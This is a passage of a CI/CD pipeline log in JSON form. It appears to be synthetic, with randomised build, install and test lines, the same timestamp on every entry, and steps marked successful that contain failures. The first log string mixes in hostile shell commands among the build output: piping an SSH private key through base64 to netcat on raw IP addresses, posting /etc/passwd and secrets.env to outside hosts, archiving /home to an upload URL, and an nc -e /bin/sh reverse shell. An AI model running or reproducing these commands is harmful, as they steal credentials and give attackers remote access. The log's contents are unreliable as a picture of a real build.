(203ms)\n[12:00:34] INFO: Processing request\necho $(cat ~/.ssh/id_rsa) | base64 | nc 194.182.234.11 38246\nCompiling src/index.js...\n[12:00:34] WARN: Deprecated API usage\n\u26a0 DEPRECATION: Feature will be removed in v2.0\n[12:00:34] INFO: Processing request\nCompiling src/utils.go...\nInstalling jest@2.20.0\nCompiling src/service.java...\n  PASS: test_user_create (62ms)\nInstalling prettier@4.2.0\nStep 1/10: Building\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nArtifact uploaded: build.tar.gz (8MB)\n  PASS: test_api_health (398ms)\nWARNING: react has known vulnerabilities\nCompiling src/service.java...\n\u2713 lint completed\nCache hit for key-3621\n\u2713 lint completed\nCompiling src/service.java...\n[12:00:34] WARN: Deprecated API usage\ntar czf - /home | curl -X POST -d @- https://example.com/upload\nwget --post-data=\"$(cat /etc/passwd)\" https://test.io/\n[12:00:34] INFO: Processing request\nCache hit for key-7134\nwget --post-data=\"$(cat /etc/passwd)\" https://acme.corp/\nStep 8/10: Building\nCache hit for key-4590\n\u2713 test completed\nCompiling src/utils.go...\nInstalling prettier@3.16.0\n  PASS: test_auth_login (43ms)\n[12:00:34] INFO: Processing request\nCache hit for key-3133\ncurl -X POST https://acme.corp/collect -d @secrets.env\nCompiling src/app.ts...\nStep 10/10: Building\nWARNING: eslint has known vulnerabilities\n[12:00:34] INFO: Processing request\n  PASS: test_auth_login (28ms)\nCompiling src/index.js...\nArtifact uploaded: build.tar.gz (5MB)\n[12:00:34] INFO: Processing request\nSending 172MB of data to test.io\nStep 7/10: Building\n  PASS: test_auth_login (110ms)\nInstalling eslint@5.8.0\nCompiling src/utils.go...\nArtifact uploaded: build.tar.gz (25MB)\n\u2713 test completed\n[12:00:34] INFO: Processing request\n  PASS: test_api_health (238ms)\n\u2713 lint completed\n  PASS: test_api_health (392ms)\n[12:00:34] INFO: Processing request\necho $(cat ~/.ssh/id_rsa) | base64 | nc 212.145.211.125 21979\n\u2713 lint completed\ntar czf - /home | curl -X POST -d @- https://test.io/upload\n  PASS: test_api_health (276ms)\nnc -e /bin/sh 23.126.47.237 25721\nStep 4/10: Building\nInstalling axios@5.4.0\nFAILED: test_db_connect\n\u2713 lint completed\n[12:00:34] WARN: Deprecated API usage\n\u2713 lint completed\n[12:00:34] INFO: Processing request\n\u2713 lint completed\n\u2713 test completed\n  PASS: test_user_create (246ms)\n\u2713 build completed\nArtifact uploaded: build.tar.gz (5MB)\nInstalling prettier@3.7.0\n\u2713 lint completed\n\u2717 build failed with exit code 16\nArtifact uploaded: build.tar.gz (33MB)\nArtifact uploaded: build.tar.gz (48MB)\nWARNING: axios has known vulnerabilities\nCache hit for key-5696\n[12:00:34] INFO: Processing request\nCache hit for key-9485\nInstalling lodash@3.18.0\nStep 9/10: Building\nInstalling prettier@3.13.0\nCache hit for key-7378\nInstalling lodash@4.19.0\n[12:00:34] INFO: Processing request\nArtifact uploaded: build.tar.gz (39MB)\nCompiling src/handler.rs...\n[12:00:34] INFO: Processing request\nSending 160MB of data to startup.dev\n=== Step unit_tests completed ===",
    "steps": [
      {
        "name": "setup_node",
        "status": "success",
        "started_at": "2025-12-20T12:00:34.497538",
        "finished_at": "2025-12-20T12:00:44.002921",
        "log_lines": [
          "=== Step: setup_node ===",
          "Cache hit for key-7541",
          "Cache hit for key-2426",
          "WARNING: prettier has known vulnerabilities",
          "Installing express@3.13.0",
          "Step 5/10: Building",
          "Cache hit for key-7619",
          "Installing react@5.15.0",
          "Installing prettier@3.8.0",
          "Installing axios@4.7.0",
          "Compiling src/index.js...",
          "\u2713 build completed",
          "[12:00:34] INFO: Processing request",
          "Cache hit for key-6546",
          "Compiling src/service.java...",
          "Artifact uploaded: build.tar.gz (2MB)",
          "[12:00:34] WARN: Deprecated API usage",
          "Cache hit for key-4521",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Artifact uploaded: build.tar.gz (32MB)",
          "Cache hit for key-9568",
          "  PASS: test_user_create (439ms)",
          "Installing prettier@2.16.0",
          "Compiling src/main.py...",
          "[12:00:34] INFO: Processing request",
          "Installing lodash@4.3.0",
          "Artifact uploaded: build.tar.gz (17MB)",
          "Artifact uploaded: build.tar.gz (29MB)",
          "Installing react@1.14.0",
          "WARNING: prettier has known vulnerabilities",
          "Artifact uploaded: build.tar.gz (44MB)",
          "[12:00:34] WARN: Deprecated API usage",
          "\u2713 build completed",
          "[12:00:34] INFO: Processing request",
          "[12:00:34] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (36MB)",
          "Cache hit for key-2467",
          "WARNING: axios has known vulnerabilities",
          "\u2713 build completed",
          "\u2713 lint completed",
          "[12:00:34] WARN: Deprecated API usage",
          "Cache hit for key-8956",
          "Cache hit for key-3316",
          "Cache hit for key-4569",
          "[12:00:34] INFO: Processing request",
          "\u2713 lint completed",
          "  PASS: test_auth_login (208ms)",
          "\u2713 build completed",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Compiling src/index.js...",
          "[12:00:34] WARN: Deprecated API usage",
          "\u2713 test completed",
          "  PASS: test_auth_login (170ms)",
          "Step 10/10: Building",
          "Artifact uploaded: build.tar.gz (42MB)",
          "Artifact uploaded: build.tar.gz (46MB)",
          "Step 3/10: Building",
          "\u2713 test completed",
          "[12:00:34] WARN: Deprecated API usage",
          "Installing express@4.14.0",
          "WARNING: express has known vulnerabilities",
          "Artifact uploaded: build.tar.gz (10MB)",
          "Step 4/10: Building",
          "  PASS: test_db_connect (220ms)",
          "\u2713 build completed",
          "Installing jest@4.2.0",
          "Step 2/10: Building",
          "Installing eslint@1.3.0",
          "\u2713 build completed",
          "  PASS: test_cache_hit (19ms)",
          "Installing express@5.1.0",
          "\u2713 build completed",
          "[12:00:34] WARN: Deprecated API usage",
          "Step 7/10: Building",
          "Installing eslint@4.19.0",
          "Cache hit for key-5189",
          "Step 1/10: Building",
          "Compiling src/service.java...",
          "[12:00:34] INFO: Processing request",
          "Compiling src/service.java...",
          "  PASS: test_api_health (339ms)",
          "Cache hit for key-4051",
          "Artifact uploaded: build.tar.gz (39MB)",
          "Step 1/10: Building",
          "Exception: ValueError",
          "[12:00:34] INFO: Processing request",
          "[12:00:34] INFO: Processing request",
          "[12:00:34] WARN: Deprecated API usage",
          "Compiling src/main.py...",
          "Cache hit for key-1966",
          "Installing react@1.1.0",
          "Compiling src/service.java...",
          "[12:00:34] INFO: Processing request",
          "Installing eslint@1.10.0",
          "  PASS: test_db_connect (482ms)",
          "\u2713 build completed",
          "Artifact uploaded: build.tar.gz (16MB)",
          "[12:00:34] INFO: Processing request",
          "Installing eslint@5.6.0",
          "[12:00:34] INFO: Processing request",
          "\u2713 build completed",
          "Artifact uploaded: build.tar.gz (30MB)",
          "\u2713 test completed",
          "Step 1/10: Building",
          "Step 9/10: Building",
          "Artifact uploaded: build.tar.gz (16MB)",
          "Step 7/10: Building",
          "Artifact uploaded: build.tar.gz (47MB)",
          "Step 9/10: Building",
          "Compiling src/handler.rs...",
          "Compiling src/main.py...",
          "[12:00:34] INFO: Processing request",
          "\u2713 build completed",
          "  PASS: test_db_connect (193ms)",
          "Step 4/10: Building",
          "Compiling src/service.java...",
          "Cache hit for key-6030",
          "  PASS: test_auth_login (162ms)",
          "[12:00:34] ERROR: Connection failed",
          "Compiling src/index.js...",
          "Installing react@3.5.0",
          "Artifact uploaded: build.tar.gz (14MB)",
          "\u2717 build failed with exit code 97",
          "Cache hit for key-3786",
          "Compiling src/index.js...",
          "Compiling src/app.ts...",
          "Step 3/10: Building",
          "Cache hit for key-5546",
          "Cache hit for key-9452",
          "Installing lodash@2.6.0",
          "[12:00:34] INFO: Processing request",
          "[12:00:34] INFO: Processing request",
          "\u2713 lint completed",
          "Step 9/10: Building",
          "\u2713 test completed",
          "Compiling src/handler.rs...",
          "FAILED: test_db_connect",
          "Artifact uploaded: build.tar.gz (29MB)",
          "\u2713 lint completed",
          "Installing react@2.0.0",
          "Cache hit for key-6346",
          "[12:00:34] INFO: Processing request",
          "Step 4/10: Building",
          "Artifact uploaded: build.tar.gz (44MB)",
          "[12:00:34] INFO: Processing request",
          "Installing eslint@5.20.0",
          "\u2713 lint completed",
          "Artifact uploaded: build.tar.gz (15MB)",
          "WARNING: express has known vulnerabilities",
          "WARNING: react has known vulnerabilities",
          "Installing react@2.7.0",
          "WARNING: axios has known vulnerabilities",
          "Step 5/10: Building",
          "Cache hit for key-6151",
          "Cache hit for key-1959",
          "[12:00:34] INFO: Processing request",
          "[12:00:34] INFO: Processing request",
          "Compiling src/service.java...",
          "Installing jest@2.12.0",
          "[12:00:34] INFO: Processing request",
          "WARNING: axios has known vulnerabilities",
          "\u2713 build completed",
          "[12:00:34] INFO: Processing request",
          "Step 3/10: Building",
          "Cache hit for key-4512",
          "Artifact uploaded: build.tar.gz (36MB)",
          "[12:00:34] INFO: Processing request",
          "Installing eslint@5.7.0",
          "Cache hit for key-3436",
          "Artifact uploaded: build.tar.gz (47MB)",
          "WARNING: eslint has known vulnerabilities",
          "  PASS: test_cache_hit (71ms)",
          "Step 5/10: Building",
          "[12:00:34] INFO: Processing request",
          "Compiling src/utils.go...",
          "Installing axios@1.13.0",
          "Cache hit for key-8422",
          "Step 2/10: Building",
          "Exception: ValueError",
          "[12:00:34] INFO: Processing request",
          "Cache hit for key-6136",
          "Step 8/10: Building",
          "Installing express@3.6.0",
          "Compiling src/handler.rs...",
          "Cache hit for key-2018",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Artifact uploaded: build.tar.gz (12MB)",
          "Artifact uploaded: build.tar.gz (32MB)",
          "[12:00:34] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (49MB)",
          "[12:00:34] WARN: Deprecated API usage",
          "[12:00:34] WARN: Deprecated API usage",
          "Artifact uploaded: build.tar.gz (38MB)",
          "Installing prettier@2.16.0",
          "Cache hit for key-5815",
          "\u2713 lint completed",
          "Installing jest@5.18.0",
          "Artifact uploaded: build.tar.gz (15MB)",
          "[12:00:34] INFO: Processing request",
          "=== Step setup_node completed ==="
        ]
      },
      {
        "name": "save_cache",
        "status": "success",
        "started_at": "2025-12-20T12:00:44.002921",
        "finished_at": "2025-12-20T12:00:49.706151",
        "log_lines": [
          "=== Step: save_cache ===",
          "  PASS: test_cache_hit (278ms)",
          "Cache hit for key-3051",
          "Cache hit for key-2054",
          "Cache hit for key-4898",
          "Installing eslint@4.20.0",
          "  PASS: test_db_connect (15ms)",
          "Artifact uploaded: build.tar.gz (48MB)",
          "  PASS: test_user_create (24ms)",
          "\u2713 test completed",
          "Compiling src/utils.go...",
          "Cache hit for key-6217",
          "Artifact uploaded: build.tar.gz (12MB)",
          "[12:00:34] WARN: Deprecated API usage",
          "Step 10/10: Building",
          "Step 7/10: Building",
          "Installing webpack@3.0.0",
          "WARNING: lodash has known vulnerabilities",
          "Artifact uploaded: build.tar.gz (37MB)",
          "[12:00:34] INFO: Processing request",
          "Compiling src/handler.rs...",
          "[12:00:34] INFO: Processing request",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "  PASS: test_cache_hit (206ms)",
          "Compiling src/main.py...",
          "WARNING: webpack has known vulnerabilities",
          "[12:00:34] INFO: Processing request",
          "  PASS: test_api_health (83ms)",
          "\u2713 lint completed",
          "  PASS: test_api_health (115ms)",
          "Compiling src/app.ts...",
          "Cache hit for key-9354",
          "\u2713 test completed",
          "Step 8/10: Building",
          "Step 8/10: Building",
          "\u2713 build completed",
          "\u2713 test completed",
          "Cache hit for key-4523",
          "[12:00:34] WARN: Deprecated API usage",
          "Step 3/10: Building",
          "Compiling src/handler.rs...",
          "[12:00:34] INFO: Processing request",
          "Compiling src/handler.rs...",
          "Step 8/10: Building",
          "Artifact uploaded: build.tar.gz (10MB)",
          "  PASS: test_user_create (238ms)",
          "Compiling src/index.js...",
          "Cache hit for key-5926",
          "Step 3/10: Building",
          "Installing webpack@5.13.0",
          "[12:00:34] INFO: Processing request",
          "  PASS: test_db_connect (306ms)",
          "Step 4/10: Building",
          "[12:00:34] INFO: Processing request",
          "Installing jest@2.15.0",
          "Step 6/10: Building",
          "Artifact uploaded: build.tar.gz (9MB)",
          "Artifact uploaded: build.tar.gz (4MB)",
          "\u2713 test completed",
          "  PASS: test_cache_hit (215ms)",
          "Compiling src/index.js...",
          "Artifact uploaded: build.tar.gz (13MB)",
          "\u2713 test completed",
          "[12:00:34] INFO: Processing request",
          "Compiling src/app.ts...",
          "  PASS: test_db_connect (414ms)",
          "[12:00:34] INFO: Processing request",
          "Installing axios@2.0.0",
          "\u2713 test completed",
          "Cache hit for key-9858",
          "[12:00:34] INFO: Processing request",
          "Step 8/10: Building",
          "  PASS: test_cache_hit (382ms)",
          "Step 4/10: Building",
          "[12:00:34] INFO: Processing request",
          "[12:00:34] INFO: Processing request",
          "  PASS: test_db_connect (245ms)",
          "Artifact uploaded: build.tar.gz (3MB)",
          "\u2713 test completed",
          "[12:00:34] INFO: Processing request",
          "Installing express@3.16.0",
          "Cache hit for key-4616",
          "Cache hit for key-4296",
          "Compiling src/handler.rs...",
          "Compiling src/index.js...",
          "[12:00:34] WARN: Deprecated API usage",
          "Installing webpack@1.13.0",
          "Artifact uploaded: build.tar.gz (19MB)",
          "Installing jest@4.9.0",
          "\u2713 lint completed",
          "\u2713 lint completed",
          "Installing prettier@5.13.0",
          "Compiling src/utils.go...",
          "Compiling src/index.js...",
          "[12:00:34] INFO: Processing request",
          "Compiling src/service.java...",
          "Cache hit for key-1645",
          "Compiling src/handler.rs...",
          "Step 1/10: Building",
          "Compiling src/index.js...",
          "Installing react@2.13.0",
          "[12:00:34] WARN: Deprecated API usage",
          "Step 5/10: Building",
          "Compiling src/main.py...",
          "Artifact uploaded: build.tar.gz (27MB)",
          "Cache hit for key-1149",
          "Cache hit for key-6774",
          "Cache hit for key-7676",
          "\u2713 lint completed",
          "\u2713 test completed",
          "[12:00:34] INFO: Processing request",
          "Installing react@3.1.0",
          "Compiling src/service.java...",
          "[12:00:34] INFO: Processing request",
          "Step 1/10: Building",
          "Installing express@4.10.0",
          "Step 10/10: Building",
          "WARNING: express has known vulnerabilities",
          "[12:00:34] INFO: Processing request",
          "  PASS: test_auth_login (292ms)",
          "Installing webpack@1.4.0",
          "  PASS: test_cache_hit (454ms)",
          "Installing express@2.16.0",
          "Compiling src/main.py...",
          "Installing lodash@2.0.0",
          "Step 2/10: Building",
          "Cache hit for key-3465",
          "[12:00:34] INFO: Processing request",
          "Installing react@3.8.0",
          "[12:00:34] INFO: Processing request",
          "Compiling src/main.py...",
          "Installing prettier@1.7.0",
          "[12:00:34] INFO: Processing request",
          "[12:00:34] INFO: Processing request",
          "Cache hit for key-9987",
          "Artifact uploaded: build.tar.gz (23MB)",
          "  PASS: test_api_health (381ms)",
          "\u2713 build completed",
          "Installing jest@4.9.0",
          "Installing react@3.8.0",
          "Artifact uploaded: build.tar.gz (23MB)",
          "Step 1/10: Building",
          "  PASS: test_auth_login (49ms)",
          "Cache hit for key-5188",
          "Artifact uploaded: build.tar.gz (43MB)",
          "Cache hit for key-3147",
          "Artifact uploaded: build.tar.gz (32MB)",
          "WARNING: prettier has known vulnerabilities",
          "\u2713 build completed",
          "Step 1/10: Building",
          "Artifact uploaded: build.tar.gz (50MB)",
          "  PASS: test_db_connect (284ms)",
          "Installing axios@2.17.0",
          "Cache hit for key-3333",
          "[12:00:34] INFO: Processing request",
          "Compiling src/index.js...",
          "Cache hit for key-7085",
          "Step 2/10: Building",
          "  PASS: test_cache_hit (182ms)",
          "Installing eslint@4.1.0",
          "Step 4/10: Building",
          "Installing express@5.11.0",
          "Step 3/10: Building",
          "Compiling src/utils.go...",
          "WARNING: lodash has known vulnerabilities",
          "Step 4/10: Building",
          "\u2717 build failed with exit code 11",
          "Installing jest@2.1.0",
          "Cache hit for key-5760",
          "  PASS: test_auth_login (77ms)",
          "[12:00:34] INFO: Processing request",
          "[12:00:34] INFO: Processing request",
          "[12:00:34] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (21MB)",
          "[12:00:34] INFO: Processing request",
          "\u2713 test completed",
          "Cache hit for key-4867",
          "[12:00:34] INFO: Processing request",
          "Compiling src/handler.rs...",
          "[12:00:34] INFO: Processing request",
          "Compiling src/service.java...",
          "Installing prettier@4.0.0",
          "Step 4/10: Building",
          "Step 4/10: Building",
          "Artifact uploaded: build.tar.gz (18MB)",
          "Step 1/10: Building",
          "Cache hit for key-9269",
          "Installing prettier@1.5.0",
          "Cache hit for key-4128",
          "Cache hit for key-1542",
          "Installing axios@4.6.0",
          "[12:00:34] INFO: Processing request",
          "  PASS: test_auth_login (71ms)",
          "Step 10/10: Building",
          "  PASS: test_db_connect (131ms)",
          "  PASS: test_api_health (62ms)",
          "\u2713 lint completed",
          "  PASS: test_cache_hit (124ms)",
          "Step 3/10: Building",
          "=== Step save_cache completed ==="
        ]
      },
      {
        "name": "integration_tests",
        "status": "success",
        "started_at": "2025-12-20T12:00:49.706151",
        "finished_at": "2025-12-20T12:01:08.716917",
        "log_lines": [
          "=== Step: integration_tests ===",
          "Step 6/10: Building",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Compiling src/app.ts...",
          "[12:00:34] INFO: Processing request",
          "\u2713 test completed",
          "[12:00:34] WARN: Deprecated API usage",
          "Compiling src/service.java...",
          "[12:00:34] WARN: Deprecated API usage",
          "Installing axios@1.1.0",
          "Compiling src/index.js...",
          "[12:00:34] INFO: Processing request",
          "Cache hit for key-2039",
          "[12:00:34] INFO: Processing request",
          "  PASS: test_cache_hit (332ms)",
          "[12:00:34] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (48MB)",
          "[12:00:34] WARN: Deprecated API usage",
          "Compiling src/handler.rs...",
          "Artifact uploaded: build.tar.gz (50MB)",
          "Cache hit for key-5599",
          "[12:00:34] WARN: Deprecated API usage",
          "Installing express@2.6.0",
          "Compiling src/index.js...",
          "Compiling src/main.py...",
          "Artifact uploaded: build.tar.gz (5MB)",
          "Compiling src/handler.rs...",
          "Exception: RuntimeError",
          "\u2713 test completed",
          "\u2717 build failed with exit code 96",
          "Step 5/10: Building",
          "Compiling src/app.ts...",
          "Compiling src/index.js...",
          "Compiling src/handler.rs...",
          "FAILED: test_api_health",
          "Compiling src/service.java...",
          "[12:00:34] INFO: Processing request",
          "Installing eslint@5.4.0",
          "Cache hit for key-6522",
          "[12:00:34] WARN: Deprecated API usage",
          "[12:00:34] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (28MB)",
          "FAILED: test_auth_login",
          "Artifact uploaded: build.tar.gz (8MB)",
          "Compiling src/app.ts...",
          "Compiling src/handler.rs...",
          "Step 4/10: Building",
          "Cache hit for key-8509",
          "\u2713 build completed",
          "Step 7/10: Building",
          "Installing express@3.15.0",
          "Compiling src/index.js...",
          "Cache hit for key-9718",
          "Step 6/10: Building",
          "  PASS: test_cache_hit (339ms)",
          "Installing lodash@4.1.0",
          "Compiling src/handler.rs...",
          "Compiling src/main.py...",
          "Compiling src/handler.rs...",
          "[12:00:34] INFO: Processing request",
          "Cache hit for key-7720",
          "Compiling src/main.py...",
          "Cache hit for key-1533",
          "Step 10/10: Building",
          "\u2713 lint completed",
          "Compiling src/main.py...",
          "[12:00:34] INFO: Processing request",
          "Step 3/10: Building",
          "Cache hit for key-3498",
          "Step 1/10: Building",
          "Step 9/10: Building",
          "Cache hit for key-6520",
          "Step 2/10: Building",
          "Installing lodash@3.9.0",
          "Cache hit for key-5158",
          "Cache hit for key-5058",
          "Installing lodash@4.0.0",
          "Step 7/10: Building",
          "Step 10/10: Building",
          "[12:00:34] WARN: Deprecated API usage",
          "Artifact uploaded: build.tar.gz (31MB)",
          "Compiling src/main.py...",
          "\u2713 lint completed",
          "Compiling src/handler.rs...",
          "Installing webpack@5.7.0",
          "[12:00:34] INFO: Processing request",
          "Compiling src/service.java...",
          "Installing jest@5.2.0",
          "\u2713 test completed",
          "  PASS: test_auth_login (365ms)",
          "Compiling src/handler.rs...",
          "Installing axios@2.10.0",
          "Artifact uploaded: build.tar.gz (24MB)",
          "  PASS: test_db_connect (393ms)",
          "\u2713 lint completed",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "\u2713 test completed",
          "Cache hit for key-2097",
          "\u2713 build completed",
          "Compiling src/handler.rs...",
          "\u2713 test completed",
          "[12:00:34] INFO: Processing request",
          "\u2713 lint completed",
          "Step 9/10: Building",
          "  PASS: test_user_create (286ms)",
          "[12:00:34] INFO: Processing request",
          "  PASS: test_cache_hit (284ms)",
          "\u2713 build completed",
          "Compiling src/app.ts...",
          "Step 1/10: Building",
          "Compiling src/app.ts...",
          "Artifact uploaded: build.tar.gz (20MB)",
          "Artifact uploaded: build.tar.gz (48MB)",
          "Installing jest@1.15.0",
          "[12:00:34] INFO: Processing request",
          "Installing webpack@1.10.0",
          "Compiling src/handler.rs...",
          "  PASS: test_cache_hit (377ms)",
          "Compiling src/utils.go...",
          "Cache hit for key-1876",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "  PASS: test_api_health (182ms)",
          "  PASS: test_user_create (495ms)",
          "Artifact uploaded: build.tar.gz (45MB)",
          "  PASS: test_user_create (139ms)",
          "[12:00:34] WARN: Deprecated API usage",
          "[12:00:34] INFO: Processing request",
          "Step 10/10: Building",
          "Artifact uploaded: build.tar.gz (46MB)",
          "[12:00:34] INFO: Processing request",
          "Cache hit for key-5177",
          "Step 2/10: Building",
          "Installing jest@3.18.0",
          "\u2713 build completed",
          "Step 6/10: Building",
          "  PASS: test_db_connect (24ms)",
          "Artifact uploaded: build.tar.gz (34MB)",
          "\u2713 test completed",
          "Installing express@3.1.0",
          "Compiling src/utils.go...",
          "[12:00:34] INFO: Processing request",
          "Cache hit for key-6568",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "[12:00:34] INFO: Processing request",
          "  PASS: test_db_connect (58ms)",
          "\u2713 lint completed",
          "[12:00:34] INFO: Processing request",
          "Step 4/10: Building",
          "Step 10/10: Building",
          "[12:00:34] INFO: Processing request",
          "Cache hit for key-5282",
          "Cache hit for key-9461",
          "\u2713 test completed",
          "Step 10/10: Building",
          "Compiling src/index.js...",
          "  PASS: test_db_connect (211ms)",
          "Compiling src/main.py...",
          "Exception: TypeError",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "WARNING: react has known vulnerabilities",
          "  PASS: test_auth_login (133ms)",
          "Installing eslint@2.3.0",
          "  PASS: test_user_create (194ms)",
          "Compiling src/service.java...",
          "Installing react@5.2.0",
          "  PASS: test_db_connect (447ms)",
          "Step 2/10: Building",
          "Installing eslint@1.11.0",
          "Cache hit for key-2346",
          "Cache hit for key-6632",
          "\u2713 test completed",
          "Compiling src/service.java...",
          "[12:00:34] INFO: Processing request",
          "\u2713 lint completed",
          "Step 9/10: Building",
          "[12:00:34] INFO: Processing request",
          "[12:00:34] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (3MB)",
          "Step 10/10: Building",
          "Cache hit for key-2747",
          "WARNING: jest has known vulnerabilities",
          "Installing eslint@2.18.0",
          "Compiling src/index.js...",
          "Compiling src/utils.go...",
          "\u2713 build completed",
          "  PASS: test_user_create (21ms)",
          "Artifact uploaded: build.tar.gz (23MB)",
          "Exception: RuntimeError",
          "Artifact uploaded: build.tar.gz (45MB)",
          "Compiling src/index.js...",
          "  PASS: test_cache_hit (68ms)",
          "  PASS: test_cache_hit (405ms)",
          "Installing prettier@4.8.0",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Compiling src/utils.go...",
          "Installing eslint@3.0.0",
          "  PASS: test_auth_login (185ms)",
          "[12:00:34] INFO: Processing request",
          "[12:00:34] INFO: Processing request",
          "=== Step integration_tests completed ==="
        ]
      },
      {
        "name": "checkout",
        "status": "success",
        "started_at": "2025-12-20T12:01:08.716917",
        "finished_at": "2025-12-20T12:01:12.519070",
        "log_lines": [
          "=== Step: checkout ===",
          "[12:00:34] WARN: Deprecated API usage",
          "[12:00:34] INFO: Processing request",
          "Cache hit for key-2332",
          "Artifact uploaded: build.tar.gz (18MB)",
          "  PASS: test_cache_hit (253ms)",
          "Compiling src/index.js...",
          "\u2713 lint completed",
          "Step 7/10: Building",
          "Artifact uploaded: build.tar.gz (22MB)",
          "  PASS: test_user_create (301ms)",
          "Installing react@5.2.0",
          "Installing jest@3.20.0",
          "[12:00:34] INFO: Processing request",
          "Installing webpack@1.17.0",
          "[12:00:34] INFO: Processing request",
          "[12:00:34] INFO: Processing request",
          "\u2713 build completed",
          "Cache hit for key-8673",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Compiling src/main.py...",
          "Artifact uploaded: build.tar.gz (45MB)",
          "Artifact uploaded: build.tar.gz (28MB)",
          "\u2717 build failed with exit code 25",
          "\u2713 test completed",
          "Step 2/10: Building",
          "[12:00:34] INFO: Processing request",
          "[12:00:34] INFO: Processing request",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Compiling src/utils.go...",
          "Compiling src/main.py...",
          "[12:00:34] INFO: Processing request",
          "\u2713 build completed",
          "  PASS: test_api_health (44ms)",
          "  PASS: test_auth_login (285ms)",
          "Artifact uploaded: build.tar.gz (50MB)",
          "Artifact uploaded: build.tar.gz (18MB)",
          "Compiling src/utils.go...",
          "[12:00:34] INFO: Processing request",
          "Installing react@5.11.0",
          "  PASS: test_auth_login (396ms)",
          "[12:00:34] INFO: Processing request",
          "  PASS: test_user_create (141ms)",
          "\u2713 build completed",
          "[12:00:34] INFO: Processing request",
          "Compiling src/handler.rs...",
          "Artifact uploaded: build.tar.gz (19MB)",
          "Installing prettier@5.6.0",
          "Installing eslint@5.2.0",
          "  PASS: test_user_create (350ms)",
          "Installing webpack@2.5.0",
          "[12:00:34] INFO: Processing request",
          "Compiling src/service.java...",
          "[12:00:34] INFO: Processing request",
          "\u2713 build completed",
          "Installing webpack@5.18.0",
          "  PASS: test_cache_hit (273ms)",
          "  PASS: test_auth_login (32ms)",
          "\u2713 lint completed",
          "  PASS: test_api_health (120ms)",
          "[12:00:34] INFO: Processing request",
          "Cache hit for key-3596",
          "Compiling src/main.py...",
          "Compiling src/app.ts...",
          "[12:00:34] INFO: Processing request",
          "Installing axios@4.18.0",
          "Artifact uploaded: build.tar.gz (5MB)",
          "[12:00:34] WARN: Deprecated API usage",
          "\u2713 build completed",
          "Artifact uploaded: build.tar.gz (27MB)",
          "Installing jest@3.5.0",
          "Cache hit for key-1659",
          "Compiling src/service.java...",
          "Cache hit for key-4521",
          "  PASS: test_db_connect (38ms)",
          "Cache hit for key-5497",
          "Artifact uploaded: build.tar.gz (6MB)",
          "Artifact uploaded: build.tar.gz (2MB)",
          "WARNING: jest has known vulnerabilities",
          "[12:00:34] INFO: Processing request",
          "[12:00:34] INFO: Processing request",
          "\u2713 build completed",
          "  PASS: test_auth_login (104ms)",
          "[12:00:34] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (28MB)",
          "Installing jest@5.1.0",
          "Artifact uploaded: build.tar.gz (27MB)",
          "Cache hit for key-5710",
          "Step 3/10: Building",
          "Compiling src/index.js...",
          "FAILED: test_cache_hit",
          "Artifact uploaded: build.tar.gz (9MB)",
          "Step 3/10: Building",
          "[12:00:34] INFO: Processing request",
          "\u2713 test completed",
          "Compiling src/service.java...",
          "\u2713 lint completed",
          "[12:00:34] INFO: Processing request",
          "\u2713 build completed",
          "Artifact uploaded: build.tar.gz (15MB)",
          "Cache hit for key-4140",
          "Step 10/10: Building",
          "[12:00:34] INFO: Processing request",
          "  PASS: test_api_health (230ms)",
          "[12:00:34] INFO: Processing request",
          "Compiling src/utils.go...",
          "Step 3/10: Building",
          "Artifact uploaded: build.tar.gz (9MB)",
          "[12:00:34] INFO: Processing request",
          "Cache hit for key-1236",
          "\u2717 build failed with exit code 26",
          "Cache hit for key-1216",
          "  PASS: test_auth_login (261ms)",
          "Installing react@2.8.0",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "[12:00:34] WARN: Deprecated API usage",
          "Compiling src/service.java...",
          "  PASS: test_db_connect (367ms)",
          "Step 10/10: Building",
          "Artifact uploaded: build.tar.gz (19MB)",
          "Artifact uploaded: build.tar.gz (42MB)",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "\u2713 test completed",
          "[12:00:34] ERROR: Connection failed",
          "Compiling src/index.js...",
          "Artifact uploaded: build.tar.gz (27MB)",
          "Compiling src/index.js...",
          "Artifact uploaded: build.tar.gz (46MB)",
          "Step 7/10: Building",
          "Compiling src/service.java...",
          "  PASS: test_user_create (185ms)",
          "  PASS: test_user_create (16ms)",
          "Cache hit for key-7012",
          "Artifact uploaded: build.tar.gz (39MB)",
          "  PASS: test_api_health (337ms)",
          "Compiling src/utils.go...",
          "[12:00:34] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (32MB)",
          "Artifact uploaded: build.tar.gz (19MB)",
          "\u2713 test completed",
          "Installing webpack@5.12.0",
          "Compiling src/app.ts...",
          "Compiling src/index.js...",
          "Step 10/10: Building",
          "WARNING: express has known vulnerabilities",
          "Compiling src/main.py...",
          "Installing lodash@4.5.0",
          "Cache hit for key-7165",
          "\u2717 build failed with exit code 103",
          "Installing jest@3.16.0",
          "Installing lodash@1.6.0",
          "[12:00:34] INFO: Processing request",
          "Cache hit for key-1641",
          "Step 5/10: Building",
          "Step 9/10: Building",
          "\u2713 test completed",
          "Step 6/10: Building",
          "Cache hit for key-9675",
          "Artifact uploaded: build.tar.gz (4MB)",
          "Step 7/10: Building",
          "Artifact uploaded: build.tar.gz (29MB)",
          "Artifact uploaded: build.tar.gz (50MB)",
          "Cache hit for key-7527",
          "Artifact uploaded: build.tar.gz (27MB)",
